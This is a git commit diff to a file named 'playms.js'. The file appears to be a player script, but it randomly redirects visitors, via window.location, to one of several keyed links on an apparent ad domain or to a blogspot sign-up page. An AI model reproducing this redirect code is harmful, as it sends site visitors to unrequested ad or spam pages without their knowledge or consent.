f2fc2076a30b8fffe6a5abce9d84afaeca0d9306
inisialjurawa <84512688+inisialjurawa@users.noreply.github.com>
2021-07-28 15:33:43 +0800

    Update playms.js

--- playms.js
+++ playms.js
@@ -10,8 +10,7 @@ var dataUrl = [
 '//wonderfullytumultbizarre.com/rmdh7vzvs?key=ed9adfc3b8491179ad53c3e027d8b8a9',
 '//wonderfullytumultbizarre.com/uqf9166i4v?key=6863b7b7d27f7caf1b440a90c37c2ffb',
 '//wonderfullytumultbizarre.com/idt1y6nan?key=ce537f67a6c57e27e292db0da8179851',
-'//filmfj.blogspot.com/'
-
+'//filmflixss.blogspot.com/signup_'
 ];
 var randomItem = dataUrl[Math.floor(Math.random()*dataUrl.length)];
 window.location = randomItem;
